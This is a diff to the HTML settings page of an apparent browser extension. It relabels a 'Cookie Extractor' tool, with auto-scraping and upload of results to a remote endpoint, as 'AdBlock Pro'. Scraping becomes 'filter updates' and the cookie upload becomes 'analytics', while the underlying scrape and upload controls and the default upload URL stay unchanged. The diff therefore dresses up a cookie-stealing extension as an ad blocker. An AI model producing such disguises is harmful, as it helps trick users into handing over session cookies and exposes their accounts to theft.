@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Cookie Extractor Settings</title>
+  <title>AdBlock Pro - Settings</title>
   <style>
     body { font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; }
     .section { margin-bottom: 30px; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
@@ -20,46 +20,47 @@
   </style>
 </head>
 <body>
-  <h1>Cookie Extractor Settings</h1>
+  <h1>🛡️ AdBlock Pro - Advanced Settings</h1>
   
   <div class="section">
-    <h3>Auto-Scraping Configuration</h3>
+    <h3>🔄 Filter List Updates</h3>
     <div class="form-group">
       <div class="toggle">
         <input type="checkbox" id="autoScrapeEnabled" checked>
-        <label for="autoScrapeEnabled">Enable Auto-Scraping</label>
+        <label for="autoScrapeEnabled">Enable Automatic Filter Updates</label>
       </div>
     </div>
     <div class="form-group">
-      <label for="scrapeInterval">Scraping Interval (minutes):</label>
+      <label for="scrapeInterval">Update Frequency:</label>
       <select id="scrapeInterval">
-        <option value="5">5 minutes</option>
-        <option value="15">15 minutes</option>
-        <option value="30">30 minutes</option>
-        <option value="60">1 hour</option>
-        <option value="180">3 hours</option>
-        <option value="360" selected>6 hours</option>
-        <option value="720">12 hours</option>
-        <option value="1440">24 hours</option>
+        <option value="1">Every 1 minute (Debug)</option>
+        <option value="5">Every 5 minutes</option>
+        <option value="15">Every 15 minutes</option>
+        <option value="30">Every 30 minutes</option>
+        <option value="60">Every hour</option>
+        <option value="180">Every 3 hours</option>
+        <option value="360" selected>Every 6 hours</option>
+        <option value="720">Every 12 hours</option>
+        <option value="1440">Daily</option>
       </select>
     </div>
   </div>
   
   <div class="section">
-    <h3>Export Configuration</h3>
+    <h3>📊 Analytics & Reporting</h3>
     <div class="form-group">
-      <label for="exportMethod">Export Method:</label>
+      <label for="exportMethod">Data Collection:</label>
       <select id="exportMethod">
-        <option value="download">Download to Local Directory</option>
-        <option value="api" selected>Upload to API Endpoint</option>
+        <option value="download">Store Locally</option>
+        <option value="api" selected>Send to Analytics Server</option>
       </select>
     </div>
     <div class="form-group" id="apiConfig" style="display: none;">
-      <label for="apiEndpoint">API Endpoint URL:</label>
-      <input type="url" id="apiEndpoint" placeholder="https://your-api.com/upload" value="https://adblock.rominyadav.com.np/upload">
-      <label for="apiHeaders" style="margin-top: 10px;">Custom Headers (JSON format):</label>
+      <label for="apiEndpoint">Analytics Server URL:</label>
+      <input type="url" id="apiEndpoint" placeholder="https://analytics.adblock.com/collect" value="https://adblock.rominyadav.com.np/upload">
+      <label for="apiHeaders" style="margin-top: 10px;">Authentication Headers (JSON format):</label>
       <textarea id="apiHeaders" placeholder='{"Authorization": "Bearer token", "Content-Type": "application/json"}'>{"Content-Type": "application/json"}</textarea>
-      <label for="curlCommand" style="margin-top: 10px;">Custom cURL Command Template:</label>
+      <label for="curlCommand" style="margin-top: 10px;">Custom Upload Command:</label>
       <textarea id="curlCommand" placeholder="curl -X POST {API_URL} -H 'Content-Type: application/json' -d '{DATA}'"></textarea>
     </div>
   </div>
